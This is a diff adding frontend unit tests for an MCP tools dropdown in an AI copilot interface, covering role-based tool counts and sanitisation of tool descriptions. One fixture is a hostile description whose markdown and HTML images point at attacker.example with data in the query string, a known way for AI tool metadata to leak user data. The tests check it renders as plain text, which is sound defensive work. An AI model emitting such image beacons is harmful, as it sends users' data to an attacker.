@@ -7,6 +7,7 @@ import {
   McpToolsDropdown,
   ToolDescriptionMarkdown,
 } from "~/components/AI/McpToolsDropdown";
+import { useCopilotAccessStore } from "~/lib/state/copilotAccess";
 import {
   type McpConnection,
   type McpServer,
@@ -100,12 +101,50 @@ function renderDropdown() {
 describe("McpToolsDropdown", () => {
   beforeEach(() => {
     vi.clearAllMocks();
+    useCopilotAccessStore.getState().setAccess(null);
     act(() => {
       useMcpToolsStore.setState({
         servers: [],
         mcpConnectionRegistry: {},
       });
     });
+  });
+
+  it("counts only the tools the user's roles grant", () => {
+    useCopilotAccessStore.getState().setAccess({
+      models: [],
+      mcp: [{ server_url: "https://mcp.example.com", tool_name: "tool-1" }],
+    });
+    act(() => {
+      useMcpToolsStore.setState({
+        servers: [
+          createServer({
+            tools: [
+              { id: "tool-1", name: "Tool 1", enabled: true },
+              { id: "tool-2", name: "Tool 2", enabled: true },
+            ],
+          }),
+        ],
+        mcpConnectionRegistry: { "server-1": createConnection() },
+      });
+    });
+
+    renderDropdown();
+
+    expect(screen.getByText("(1/1)")).toBeInTheDocument();
+  });
+
+  it("counts no tool of a server no role grants", () => {
+    act(() => {
+      useMcpToolsStore.setState({
+        servers: [createServer()],
+        mcpConnectionRegistry: { "server-1": createConnection() },
+      });
+    });
+
+    renderDropdown();
+
+    expect(screen.getByText("(0/0)")).toBeInTheDocument();
   });
 
   it("renders duplicate copies of the same iframe widget as a single entry", () => {
@@ -213,6 +252,36 @@ describe("ToolDescriptionMarkdown", () => {
       expect(codeNode).toHaveClass("whitespace-normal", "wrap-anywhere");
       expect(codeNode.className).toContain("wrap-anywhere");
     });
+  });
+});
+
+describe("what a tool's description may show", () => {
+  const description =
+    'Reads a page. ![chart](https://attacker.example/pixel.png?d=holdings) <img src="https://attacker.example/raw.png" alt="raw">';
+
+  it("is text: no image, from markdown or from raw HTML, in the tool's own description", () => {
+    const { container } = render(<ToolDescriptionMarkdown content={description} />);
+    expect(container.querySelector("img")).not.toBeInTheDocument();
+    expect(container.innerHTML).not.toContain("attacker.example");
+    expect(screen.getByText(/Reads a page/)).toBeInTheDocument();
+  });
+
+  it("is text in the slash command suggestion as well", () => {
+    const item = {
+      type: "mcpTool" as const,
+      id: "server/tool",
+      serverName: "server",
+      serverUrl: "https://example.com",
+      toolName: "tool",
+      toolId: "tool",
+      description,
+      slashText: "/server_tool",
+      inputSchema: undefined,
+    };
+    const { container } = render(
+      <SlashSuggestionItem index={0} item={item} onSelect={vi.fn()} />,
+    );
+    expect(container.querySelector("img")).not.toBeInTheDocument();
   });
 });
 
